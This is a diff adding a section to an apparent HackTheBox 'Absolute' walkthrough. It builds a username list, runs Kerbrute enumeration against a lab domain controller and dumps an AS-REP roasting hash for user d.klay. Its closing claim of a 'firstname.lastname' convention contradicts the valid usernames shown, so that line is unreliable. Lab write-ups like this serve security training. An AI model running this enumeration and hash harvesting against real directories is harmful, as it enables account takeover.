@@ -184,6 +184,66 @@ Jeffer Robinson
 Nicole Smith
 ```
 
+From experience, naming conventions follow a particular pattern, so I put them in a users.txt file as such:
+
+users.txt:
+
+```
+James Roberts
+Michael Chaffrey
+Donald Klay
+Sarah Osvald
+Jeffer Robinson
+Nicole Smith
+
+j.roberts
+m.chaffrey
+d.klay
+s.osvald
+j.robinson
+n.smith
+
+james.roberts
+michael.chaffrey
+donald.klay
+sarah.osvald
+jeffer.robinson
+nicole.smith
+```
+
+#### Kerbrute User Enumeration
+
+I then followed this users list up with `Kerbrute`:
+
+```
+./kerbrute_linux_arm64 userenum --dc 10.129.228.64 -d absolute.htb users.txt
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: dev (9cfb81e) - 05/06/23 - Ronnie Flathers @ropnop
+
+2023/05/06 10:42:11 >  Using KDC(s):
+2023/05/06 10:42:11 >  	10.129.228.64:88
+
+2023/05/06 10:42:11 >  [+] VALID USERNAME:	 s.osvald@absolute.htb
+2023/05/06 10:42:11 >  [+] VALID USERNAME:	 m.chaffrey@absolute.htb
+2023/05/06 10:42:11 >  [+] VALID USERNAME:	 j.roberts@absolute.htb
+2023/05/06 10:42:11 >  [+] VALID USERNAME:	 j.robinson@absolute.htb
+2023/05/06 10:42:11 >  [+] VALID USERNAME:	 n.smith@absolute.htb
+2023/05/06 10:42:11 >  [+] d.klay has no pre auth required. Dumping hash to crack offline:
+$krb5asrep$18$d.klay@ABSOLUTE.HTB:2a034fd77692e217419006b3c74eb5d5$ad27aa64e3a1a7469e7e2fa5e36963a78dcb639af2ecab54db438232b39bde56b201e534290841382da8c1a503c0aa953082aa5509d3d7ee41314a959b0a71953d731de2c49c54cee77dcfb94a361e05a80918913c11a0a6871bc93895e581df4264f63f3a3ec40bb28728474c022322679e9d3076d32354b737b65d2b3a588b61a7020c61c1d0a9375c3d7c26c6371078ec968072caa99ec3ef9bddfa551103cc30e7e0754fecdaadb348a4f451b55066d2fc56e1d8fbf9b3692382443706c8fbb8c709eda1c1ed05afeeb12dafb71c3d57e3f883a1af6bc851f8014dd54fa14e4707a5ebe007a11d578746fa82f8e5ed0cf099e325ac2f3263f2b156e23d47
+2023/05/06 10:42:11 >  [+] VALID USERNAME:	 d.klay@absolute.htb
+2023/05/06 10:42:11 >  Done! Tested 18 usernames (6 valid) in 0.214 seconds
+```
+
+We see that <mark style="color:yellow;">d.klay was vulnerable to AS-REP Roasting</mark>! We know this because they have Kerberos pre-authentication disabled. Also, we validated the other usernames; confirming the naming convention!
+
+<mark style="color:yellow;">firstname.lastname</mark>
+
 #### Subdomain Enumeration
 
 ```
